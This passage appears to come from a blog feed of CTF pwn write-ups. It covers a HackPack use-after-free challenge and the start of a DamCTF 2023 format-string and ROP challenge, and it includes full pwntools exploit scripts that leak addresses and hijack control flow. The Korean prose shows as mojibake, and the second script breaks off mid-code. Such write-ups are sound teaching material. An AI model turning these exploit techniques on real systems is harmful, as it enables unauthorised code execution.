ìžˆë‹¤. uaf ì·¨ì•½ì ì€ ë³´í†µ ì´ë ‡ê²Œ ì´ìš©ëœë‹¤. </p><p><code>createRandomNum</code> í•¨ìˆ˜ëŠ” ì•„ëž˜ì™€ ê°™ì´ <code>main</code> í•¨ìˆ˜ì—ì„œ í˜¸ì¶œë˜ê³  ì´ìš©ëœë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">          _func_result = createRandomNum();</span><br><span class="line">        func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag ì‹¤í–‰</span></span><br><span class="line">        _func_result[<span class="number">1</span>] = *_func_result;</span><br><span class="line">        *_func_result = func_result;</span><br><span class="line">        <span class="keyword">goto</span> print_random_num;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">print_random_num:</span><br><span class="line">        <span class="keyword">if</span> ( _func_result )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *_func_result);       </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;No Random Number has been generated\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p><code>_func_result</code>ê°€ ì—†ëŠ” ê²½ìš° <code>createRandomNum</code> í•¨ìˆ˜ë¥¼ í†µí•´ ëžœë¤í•œ ìˆ˜ë¥¼ ë°›ì•„ì˜¨ë‹¤. ëžœë¤í•œ ìˆ˜ë¥¼ ì–´ë–»ê²Œ ë°›ì•„ì˜¤ëƒ? <code>func_result = ((__int64 (*)(void))_func_result[2])();</code> ì´ ë¼ì¸ì„ í†µí•´ <code>createRandomNum</code> í•¨ìˆ˜ì—ì„œ ë©”ëª¨ë¦¬ì— ì €ìž¥í•œ <code>generateRandNum</code> í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ì‹¤í–‰í•œë‹¤. ê·¸ ê²°ê³¼ë¥¼ 7ë²ˆ ë©”ë‰´ì—ì„œ ì¶œë ¥í•  ìˆ˜ ìžˆë‹¤. </p><p>ìš°ë¦¬ëŠ” <code>generateRandNum</code> í•¨ìˆ˜ ëŒ€ì‹  <code>printFlag</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ê²ƒì´ë‹¤. ê·¸ëŸ¬ë©´ ë°”ë¡œ <code>func_result = ((__int64 (*)(void))_func_result[2])();</code> ì´ ë¼ì¸ì—ì„œ í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ì–´ <code>flag.txt</code>ê°€ ë³´ì¼ ê²ƒì´ë‹¤.</p><h3 id="How-to-leak"><a href="#How-to-leak" class="headerlink" title="How to leak"></a>How to leak</h3><p>ë¬¸ì œëŠ” ì´ ë¬¸ì œì— <code>pie</code>ê°€ ê±¸ë ¤ìžˆë‹¤. <code>leak</code>ì€ ì–´ë–»ê²Œ í•˜ë©´ ì¢‹ì„ê¹Œ? ì•„ëž˜ í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">readObject</span><span class="params">(<span class="type">int</span> idx, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = *(<span class="type">char</span> **)(<span class="number">8LL</span> * idx + a2);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *((_QWORD *)s + <span class="number">2</span>));   <span class="comment">// ì£¼ì†Œ leak</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>*((_QWORD *)s + 2)</code>ì„ ì¶œë ¥í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì•„ <code>name_ptr</code>ì˜ <code>num</code>ì„ ì¶œë ¥í•´ì¤€ë‹¤. ì´ í•¨ìˆ˜ë¥¼ í†µí•´ <code>leak</code>ì„ í•  ìˆ˜ ìžˆëŠ”ë°, ë¨¼ì € <code>obj</code> êµ¬ì¡°ì²´ë¥¼ ë§Œë“¤ê³  í•´ì œí•œë‹¤. ê·¸ ë‹¤ìŒ <code>createRandomNum</code> í•¨ìˆ˜ë¥¼ í†µí•´ <code>obj[x]</code>ê°€ ê°€ë¦¬í‚¤ëŠ” <code>name_ptr+2</code> ì¦‰ <code>num</code> ìœ„ì¹˜ì— <code>generateRandNum</code> í•¨ìˆ˜ í¬ì¸í„°ê°€ ìœ„ì¹˜í•˜ê²Œ í•œë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ <code>readObject</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œì¼œ <code>generateRandNum</code> í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ êµ¬í•˜ê³  <code>pie address</code>ê¹Œì§€ êµ¬í•  ìˆ˜ ìžˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>createStaticNum</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ <code>malloc</code></li><li><code>deleteObject</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ <code>free</code></li><li><code>createRandomNum</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ <code>num</code> ìœ„ì¹˜ì— <code>func_ptr</code>ì´ ìœ„ì¹˜í•˜ë„ë¡ <code>malloc</code></li><li><code>readObject</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ <code>pie</code> ì£¼ì†Œ <code>leak</code></li><li><code>deleteObject</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ <code>free</code></li><li><code>createStaticNum</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ <code>malloc</code> ì´ ë•Œ <code>num</code> ìœ„ì¹˜ì— <code>printFlag</code> í•¨ìˆ˜ ì£¼ì†Œ ìž…ë ¥</li><li><code>deleteObject</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ <code>free</code></li><li><code>6</code>ë²ˆ ë©”ë‰´ë¥¼ ì´ìš©í•˜ì—¬ <code>printFlag</code> í•¨ìˆ˜ ì‹¤í–‰<ul><li>ì´ê²ƒì´ ê°€ëŠ¥í•œ ì´ìœ ê°€ ì•„ëž˜ì™€ ê°™ì´ íƒœì´ˆì— í•œ ë²ˆë§Œ randomí•œ ìˆ˜ë¥¼ ë°›ê¸° ë•Œë¬¸ì´ë‹¤. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">    _func_result = createRandomNum();</span><br><span class="line">    func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag ì‹¤í–‰</span></span><br></pre></td></tr></table></figure></li><li>3ë²ˆ ê³¼ì •ì—ì„œ <code>createRandomNum</code> í•¨ìˆ˜ë¥¼ í•œ ë²ˆ ì‹¤í–‰í–ˆìœ¼ë¯€ë¡œ <code>_func_result</code>ì€ ì´ë¯¸ ê°’ì´ ì±„ì›Œì ¸ìžˆë‹¤.</li></ul></li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;cha.hackpack.club&#x27;</span>, <span class="number">41705</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createStaticNum</span>(<span class="params">idx, name, addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;number: &#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteObject</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readObject</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createRandomNum</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># show flag.txt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showRandomNum</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">createStaticNum(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">1234</span>)</span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line">createRandomNum()</span><br><span class="line">readObject(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) - <span class="number">0x1257</span></span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line">createStaticNum(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, e.address + <span class="number">0x1244</span>) <span class="comment"># e.sym[&#x27;printFlag&#x27;]</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">createRandomNum()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;n3v3r_tru5t_fr33_jVmVsEuj&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HackPack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> uaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dam CTF 2023 - baby-review (fsb)</title>
      <link href="/230414-damctf2023-baby-review/"/>
      <url>/230414-damctf2023-baby-review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1872">https://ctftime.org/event/1872</a></li></ul><blockquote><p>unknown</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><p>ë¡¸ì—…ì„ ë„ˆë¬´ ëŠ¦ê²Œ ìž‘ì„±í•´ì„œ ì‚¬ì´íŠ¸ê°€ ë‹«í˜”ë‹¤.. ë‚´ê°€ 41ë²ˆì§¸ë¡œ í’€ì—ˆë˜ ê²ƒ ê°™ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *country; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  srand(v3);</span><br><span class="line">  load_countries(v4, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Alright I need to prove you&#x27;re human so lets do some geography&quot;</span>);</span><br><span class="line">  v8 = rand() % num_countries;</span><br><span class="line">  country = (<span class="type">char</span> *)&amp;countries + <span class="number">100</span> * v8;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What is the capital of %s?\n&quot;</span>, country);</span><br><span class="line">  fgets(input, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  input[<span class="built_in">strcspn</span>(input, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, country + <span class="number">50</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Incorrect. The capital of %s is %s.\n&quot;</span>, country, country + <span class="number">50</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Alright I&#x27;ll let you through&quot;</span>);</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>load_countries</code> í•¨ìˆ˜ëŠ” ê°„ë‹¨í•˜ê²Œ ì´ì•¼ê¸°í•˜ë©´ ì„œë²„ì— ìžˆëŠ” txt íŒŒì¼ì—ì„œ countryì™€ capitalì„ ì½ì–´ì˜¤ëŠ” ê²ƒì´ë‹¤. countryëŠ” <code>country</code>ì— ì €ìž¥ë˜ê³  capitalì€ <code>country + 50</code>ì— ì €ìž¥ëœë‹¤. ì´ ë‘ ê°œì˜ ë°ì´í„°ë¥¼ ì½ì–´ì˜¤ëŠ” txt íŒŒì¼ ë‚´ë¶€ëŠ” ì•„ëž˜ì™€ ê°™ì´ ìƒê²¼ë‹¤. <code>,</code> ê¸°ì¤€ìœ¼ë¡œ ìž˜ë¼ì„œ ì½ëŠ”ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaa,bbbb</span><br><span class="line">cccc,dddd</span><br></pre></td></tr></table></figure><p>ì§ì— ë§žëŠ” countryì™€ captialì„ ë§žì¶°ì£¼ë©´ <code>menu</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ê²Œ ë˜ê³  ë³¸ê²©ì ì¸ êµ¬í˜„ì´ ì‹œìž‘ëœë‹¤. ì°¸ê³ ë¡œ í‹€ë¦¬ë©´ ì •ë‹µì„ ì•Œë ¤ì£¼ë‹ˆ remoteë¡œ ë¬¸ì œë¥¼ í’€ ë•Œ ì¼ë¶€ëŸ¬ í‹€ë ¤ì„œ ë°ì´í„°ë“¤ì„ ëª¨ì•„ì„œ í’€ë©´ ëœë‹¤. í•œ ë²ˆë§Œ ë§žì¶”ë©´ <code>menu</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ë‹ˆ ë§žì¶œ ë•Œê¹Œì§€ ì—°ê²°í–ˆë‹¤ê°€ ëŠì–´ì£¼ê³  í•˜ë©´ ëœë‹¤.</p><p><code>menu</code> í•¨ìˆ˜ë¥¼ ë³´ë©´ 5 ê°€ì§€ ê¸°ëŠ¥ì´ ìžˆê³  ê° ê¸°ëŠ¥ì„ ì‚´íŽ´ë´ì•¼ í•œë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( choice )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    read_book();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">    watch_movie(fsb);                       <span class="comment">// leak something</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">    review();                               <span class="comment">// put payload</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sad to see you go.&quot;</span>);             <span class="comment">// bof</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Could I get your name for my records?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">48uLL</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">    (fsb);                         <span class="comment">// read(0, fsb, 0x12CuLL);</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì£¼ì„ì— ì ížŒëŒ€ë¡œ <code>watch_movie</code> í•¨ìˆ˜ì—ì„œëŠ” ì‰½ê²Œ <code>printf(buf)</code>ë¡œ ì¸í•´ ëŒ€ë†“ê³  FSBê°€ ë°œìƒí•œë‹¤. ìž…ë ¥ì€ 5ë²ˆ ë©”ë‰´ì¸ <code>add_movie</code> í•¨ìˆ˜ì—ì„œ ì•„ëž˜ì™€ ê°™ì´ ì´ë¤„ì§„ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">add_movie</span><span class="params">(<span class="type">void</span> *fsb)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your movie link here and I&#x27;ll add it to the list&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, fsb, <span class="number">0x12C</span>uLL);</span><br><span class="line">  result = <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)fsb, <span class="string">&quot;%n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>n</code>ì´ í•„í„°ë§ë˜ì–´ ìžˆì–´ì„œ <code>p</code>ë¥¼ ì‚¬ìš©í•´ì„œ ì£¼ì†Œ leakë§Œ í•  ìˆ˜ ìžˆë‹¤.</p><p>í•œíŽ¸, 4ë²ˆ ë©”ë‰´ì—ì„  BOFê°€ ë°œìƒí•˜ëŠ”ë° ë²„í¼ì˜ ìœ„ì¹˜ê°€ ì•„ëž˜ì™€ ê°™ì•„ì„œ ì •ë§ ì•„ìŠ¬í•˜ê²Œ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•œë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char buf[32]; // [rsp+130h] [rbp-20h] BYREF</span><br></pre></td></tr></table></figure><p>ëŒ€ì‹  <code>review</code> í•¨ìˆ˜ë¥¼ ë³´ë©´ ì•„ì£¼ ë„‰ë„‰í•˜ê²Œ ë³€ìˆ˜ì—ë‹¤ê°€ ìž…ë ¥ì„ ë°›ê³  ìžˆìœ¼ë¯€ë¡œ ì—¬ê¸°ë‹¤ê°€ payloadë¥¼ ì €ìž¥ì‹œì¼œ ë†“ê³  íë¦„ì„ ë°”ê¾¸ë©´ ë  ê²ƒ ê°™ë‹¤!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">review</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">1008</span>]; <span class="comment">// [rsp+0h] [rbp-430h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+3F0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is the name of the book/movie you would like to review?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">59uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Okay, write your review below:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">1000uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thanks! I&#x27;ll make sure to take note of this review.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>captital ì§ˆë¬¸ ë§žì¶”ê¸°</li><li><code>add_movie</code> í•¨ìˆ˜ì™€ <code>watch_movie</code> í•¨ìˆ˜ë¥¼ í†µí•´ FSBë¥¼ ì´ìš©í•˜ì—¬ leak stack, libc address</li><li><code>review</code> í•¨ìˆ˜ë¥¼ í†µí•´ <code>system</code> í•¨ìˆ˜ ì‹¤í–‰í•˜ëŠ” rop payload ìž…ë ¥</li><li>4ë²ˆ ë©”ë‰´ë¥¼ í†µí•´ íë¦„ì„ rop payloadê°€ ì €ìž¥ëœ ìŠ¤íƒìœ¼ë¡œ ë³€ê²½</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall-p&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;chals.damctf.xyz&#x27;</span>, <span class="number">30888</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;capital of &#x27;</span>)</span><br><span class="line">    country = p.recvline()</span><br><span class="line">    country = country[:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if country == b&#x27;aaaa&#x27;:</span></span><br><span class="line">    <span class="comment">#     p.sendline(b&#x27;bbbb&#x27;)</span></span><br><span class="line">    <span class="comment"># if country == 